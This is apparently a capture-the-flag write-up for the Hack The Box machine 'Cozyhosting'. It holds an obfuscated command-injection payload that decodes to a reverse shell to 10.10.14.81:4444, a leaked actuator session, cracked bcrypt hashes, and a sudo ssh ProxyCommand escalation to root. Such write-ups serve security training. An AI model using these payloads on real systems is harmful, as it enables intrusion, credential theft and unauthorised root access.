# Cozyhosting

## Info

Cozyhosting is an easy rated box from Hack The Box.  

## Enumeration

Using a spring boot wordlist, the following session info was found.  

```
http://cozyhosting.htb/actuator/sessions
```

```
{"726B7C2F54969DD2EB001E24308590DD":"kanderson"}
```

After accessing the admin panel, there is an endpoint that executes ssh. Command injection payload.

`bash<<<$(base64${IFS}-d<<<c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODEvNDQ0NCAwPiYxCg==)`

Enumerating the application jar file.  

```
host=hacker.htb&username=hackerman@localhost||`bash<<<$(base64${IFS}-d<<<c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuODEvNDQ0NCAwPiYxCg==)`
```

```
username=kanderson&password=MRdEQuv6~6P9
```

postgres user database password.  

```
spring.datasource.password=Vg&nvzAQ7XxR
```
Database creds.  

```
kanderson $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
admin     $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
```

Hashcat command to crack admin hash.  

```
sudo hashcat -m 3200 -a 0 admin.hash /usr/share/wordlists/rockyou.txt --force
```

```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

## User

Can ssh with josh:manchesterunited

## Root

josh can run /usr/bin/ssh *  

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
